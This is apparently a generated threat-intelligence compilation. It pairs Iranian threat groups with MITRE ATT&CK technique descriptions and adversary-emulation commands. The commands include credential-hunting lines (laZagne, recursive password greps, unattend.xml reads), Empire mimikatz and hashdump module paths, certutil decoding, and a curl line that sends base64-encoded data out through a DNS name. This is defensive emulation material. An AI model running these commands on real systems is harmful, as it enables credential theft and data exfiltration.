powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/trust_keys
powershell/credentials/mimikatz/trust_keys
powershell/credentials/powerdump
powershell/credentials/powerdump
powershell/credentials/vault_credential
powershell/credentials/vault_credential
powershell/management/downgrade_account
powershell/management/downgrade_account
powershell/management/wdigest_downgrade
powershell/management/wdigest_downgrade
powershell/privesc/gpp
powershell/privesc/gpp
powershell/privesc/mcafee_sitelist
powershell/privesc/mcafee_sitelist
python/collection/linux/hashdump
python/collection/linux/hashdump
python/collection/linux/mimipenguin
python/collection/linux/mimipenguin
python/collection/osx/hashdump
python/collection/osx/hashdump
python/collection/osx/kerberosdump
python/collection/osx/kerberosdump
python/management/multi/kerberos_inject
python/management/multi/kerberos_inject
python/situational_awareness/network/dcos/etcd_crawler
python/situational_awareness/network/dcos/etcd_crawler
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Credentials from Web Browsers

## Technique Description

```
Adversaries may acquire credentials from web browsers by reading files specific to the target browser.  (Citation: Talos Olympic Destroyer 2018) 

Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.

For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key. (Citation: Microsoft CryptUnprotectData ‎April 2018)
 
Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017)

Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)

After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).
```

## Technique Commands

```
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Credentials in Files

## Technique Description

```
Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

It is possible to extract passwords from backups or saved virtual machines through [Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)

In cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. (Citation: Specter Ops - Cloud Credential Storage)


```

## Technique Commands

```
shell laZagne.exe browsers [-f]
python2 laZagne.py all
grep -ri password /
findstr /si pass *.xml | *.doc | *.txt | *.xls
ls -R | select-string -Pattern password
type C:\Windows\Panther\unattend.xml > nul 2>&1
type C:\Windows\Panther\Unattend\unattend.xml > nul 2>&1
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Credentials in Files

## Technique Description

```
Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

It is possible to extract passwords from backups or saved virtual machines through [Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)

In cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. (Citation: Specter Ops - Cloud Credential Storage)


```

## Technique Commands

```
shell laZagne.exe browsers [-f]
python2 laZagne.py all
grep -ri password /
findstr /si pass *.xml | *.doc | *.txt | *.xls
ls -R | select-string -Pattern password
type C:\Windows\Panther\unattend.xml > nul 2>&1
type C:\Windows\Panther\Unattend\unattend.xml > nul 2>&1
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Custom Command and Control Protocol

## Technique Description

```
Adversaries may communicate using a custom command and control protocol instead of encapsulating commands/data in an existing [Standard Application Layer Protocol](https://attack.mitre.org/techniques/T1071). Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.
```

## Technique Commands

```
```



# Actor: CopyKittens

## Actor Description

```
[CopyKittens](https://attack.mitre.org/groups/G0052) is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The group is responsible for the campaign known as Operation Wilted Tulip. (Citation: ClearSky CopyKittens March 2017) (Citation: ClearSky Wilted Tulip July 2017) (Citation: CopyKittens Nov 2015)
```

## Actor Aliases

```
CopyKittens
```

## Technique Name: Data Compressed

## Technique Description

```
An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.
```

## Technique Commands

```
dir #{input_file} -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\data.zip
dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\data.zip
rar a -r #{output_file} #{input_path} *.txt
rar a -r %USERPROFILE%\data.rar #{input_path} *.txt
rar a -r #{output_file} %USERPROFILE% *#{file_extension}
zip $HOME/data.zip #{input_files}
zip $HOME/data.zip $HOME/*.txt
test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo '#{input_content}' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)
test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)
tar -cvzf $HOME/data.tar.gz #{input_file_folder}
tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME
rar.exe
powershell/management/zipfolder
powershell/management/zipfolder
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Data Compressed

## Technique Description

```
An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.
```

## Technique Commands

```
dir #{input_file} -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\data.zip
dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\data.zip
rar a -r #{output_file} #{input_path} *.txt
rar a -r %USERPROFILE%\data.rar #{input_path} *.txt
rar a -r #{output_file} %USERPROFILE% *#{file_extension}
zip $HOME/data.zip #{input_files}
zip $HOME/data.zip $HOME/*.txt
test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo '#{input_content}' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)
test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)
tar -cvzf $HOME/data.tar.gz #{input_file_folder}
tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME
rar.exe
powershell/management/zipfolder
powershell/management/zipfolder
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Data Compressed

## Technique Description

```
An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.
```

## Technique Commands

```
dir #{input_file} -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\data.zip
dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\data.zip
rar a -r #{output_file} #{input_path} *.txt
rar a -r %USERPROFILE%\data.rar #{input_path} *.txt
rar a -r #{output_file} %USERPROFILE% *#{file_extension}
zip $HOME/data.zip #{input_files}
zip $HOME/data.zip $HOME/*.txt
test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo '#{input_content}' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)
test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)
tar -cvzf $HOME/data.tar.gz #{input_file_folder}
tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME
rar.exe
powershell/management/zipfolder
powershell/management/zipfolder
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Data Compressed

## Technique Description

```
An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.
```

## Technique Commands

```
dir #{input_file} -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\data.zip
dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\data.zip
rar a -r #{output_file} #{input_path} *.txt
rar a -r %USERPROFILE%\data.rar #{input_path} *.txt
rar a -r #{output_file} %USERPROFILE% *#{file_extension}
zip $HOME/data.zip #{input_files}
zip $HOME/data.zip $HOME/*.txt
test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo '#{input_content}' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)
test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)
tar -cvzf $HOME/data.tar.gz #{input_file_folder}
tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME
rar.exe
powershell/management/zipfolder
powershell/management/zipfolder
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Data Compressed

## Technique Description

```
An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.
```

## Technique Commands

```
dir #{input_file} -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\data.zip
dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\data.zip
rar a -r #{output_file} #{input_path} *.txt
rar a -r %USERPROFILE%\data.rar #{input_path} *.txt
rar a -r #{output_file} %USERPROFILE% *#{file_extension}
zip $HOME/data.zip #{input_files}
zip $HOME/data.zip $HOME/*.txt
test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo '#{input_content}' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)
test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)
tar -cvzf $HOME/data.tar.gz #{input_file_folder}
tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME
rar.exe
powershell/management/zipfolder
powershell/management/zipfolder
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Data Encoding

## Technique Description

```
Command and control (C2) information is encoded using a standard data encoding system. Use of data encoding may be to adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64,  MIME, UTF-8, or other binary-to-text and character encoding systems. (Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.
```

## Technique Commands

```
echo -n 111-11-1111 | base64
curl -XPOST MTExLTExLTExMTE=.#{destination_url}
echo -n 111-11-1111 | base64
curl -XPOST MTExLTExLTExMTE=.redcanary.com
```



# Actor: CopyKittens

## Actor Description

```
[CopyKittens](https://attack.mitre.org/groups/G0052) is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The group is responsible for the campaign known as Operation Wilted Tulip. (Citation: ClearSky CopyKittens March 2017) (Citation: ClearSky Wilted Tulip July 2017) (Citation: CopyKittens Nov 2015)
```

## Actor Aliases

```
CopyKittens
```

## Technique Name: Data Encrypted

## Technique Description

```
Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.

Other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over Command and Control Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)
```

## Technique Commands

```
echo "This file will be encrypted" > /tmp/victim-gpg.txt
mkdir PathToAtomicsFolder/T1022/victim-files
cd /tmp/victim-files
touch a b c d e f g
zip --password "insert password here" $PathToAtomicsFolder/victim-files.zip /tmp/victim-files/*
gpg -c $PathToAtomicsFolder/T1022/victim-gpg.txt
<enter passphrase and confirm>
ls -l
mkdir .\tmp\victim-files
cd .\tmp\victim-files
echo "This file will be encrypted" > .\encrypted_file.txt
rar a -hp"blue" hello.rar
dir
path=%path%;"C:\Program Files (x86)\winzip"
mkdir .\tmp\victim-files
cd .\tmp\victim-files
echo "This file will be encrypted" > .\encrypted_file.txt
winzip32 -min -a -s"hello" archive.zip *
dir
mkdir $PathToAtomicsFolder\T1022\victim-files
cd $PathToAtomicsFolder\T1022\victim-files
echo "This file will be encrypted" > .\encrypted_file.txt
7z a archive.7z -pblue
dir
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Deobfuscate/Decode Files or Information

## Technique Description

```
Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware, [Scripting](https://attack.mitre.org/techniques/T1064), [PowerShell](https://attack.mitre.org/techniques/T1086), or by using utilities present on the system.

One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia)

Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)

Payloads may be compressed, archived, or encrypted in order to avoid detection.  These payloads may be used with [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.
```

## Technique Commands

```
certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt
certutil -decode %temp%\T1140_calc.txt %temp%T1140_calc_decoded.exe
copy %windir%\system32\certutil.exe %temp%\tcm.tmp
%temp%\tcm.tmp -decode C:\Windows\System32\calc.exe %temp%\T1140.txt
certutil.exe -decode
-decode|-urlcachecertutil.exe
certutil.exe|-decode|-urlcache
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Deobfuscate/Decode Files or Information

## Technique Description

```
Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware, [Scripting](https://attack.mitre.org/techniques/T1064), [PowerShell](https://attack.mitre.org/techniques/T1086), or by using utilities present on the system.

One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia)

Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)

Payloads may be compressed, archived, or encrypted in order to avoid detection.  These payloads may be used with [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.
```

## Technique Commands

```
certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt
certutil -decode %temp%\T1140_calc.txt %temp%T1140_calc_decoded.exe
copy %windir%\system32\certutil.exe %temp%\tcm.tmp
%temp%\tcm.tmp -decode C:\Windows\System32\calc.exe %temp%\T1140.txt
certutil.exe -decode
-decode|-urlcachecertutil.exe
certutil.exe|-decode|-urlcache
```



# Actor: Leafminer

## Actor Description

```
[Leafminer](https://attack.mitre.org/groups/G0077) is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. (Citation: Symantec Leafminer July 2018)
```

## Actor Aliases

```
Leafminer
Raspite
```

## Technique Name: Drive-by Compromise

## Technique Description

```
A drive-by compromise is when an adversary gains access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring application access tokens.

Multiple ways of delivering exploit code to a browser exist, including:

* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.
* Malicious ads are paid for and served through legitimate ad providers.
* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).

Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring. (Citation: Shadowserver Strategic Web Compromise)

Typical drive-by compromise process:

1. A user visits a website that is used to host the adversary controlled content.
2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. 
    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.
3. Upon finding a vulnerable version, exploit code is delivered to the browser.
4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.
    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.

Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.

Adversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)
```

## Technique Commands

```
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Dynamic Data Exchange

## Technique Description

```
Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)

Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.
```

## Technique Commands

```
start $PathToAtomicsFolder\T1173\bin\DDE_Document.docx
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Email Collection

## Technique Description

```
Adversaries may target user email to collect sensitive information from a target.

Files containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.

Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services or Office 365 to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific key words.(Citation: Black Hills MailSniper, 2017)

### Email Forwarding Rule

Adversaries may also abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Outlook and Outlook Web App (OWA) allow users to create inbox rules for various email functions, including forwarding to a different recipient. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: TIMMCMIC, 2014)

Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. 
```

## Technique Commands

```
powershell -executionpolicy bypass -command $PathToAtomicsFolder\T1114\Get-Inbox.ps1 -file $home\desktop\mail.csv
powershell/management/mailraider/disable_security
powershell/management/mailraider/disable_security
powershell/management/mailraider/get_emailitems
powershell/management/mailraider/get_emailitems
powershell/management/mailraider/get_subfolders
powershell/management/mailraider/get_subfolders
powershell/management/mailraider/mail_search
powershell/management/mailraider/mail_search
powershell/management/mailraider/search_gal
powershell/management/mailraider/search_gal
powershell/management/mailraider/send_mail
powershell/management/mailraider/send_mail
powershell/management/mailraider/view_email
powershell/management/mailraider/view_email
python/collection/osx/search_email
python/collection/osx/search_email
```



# Actor: Leafminer

## Actor Description

```
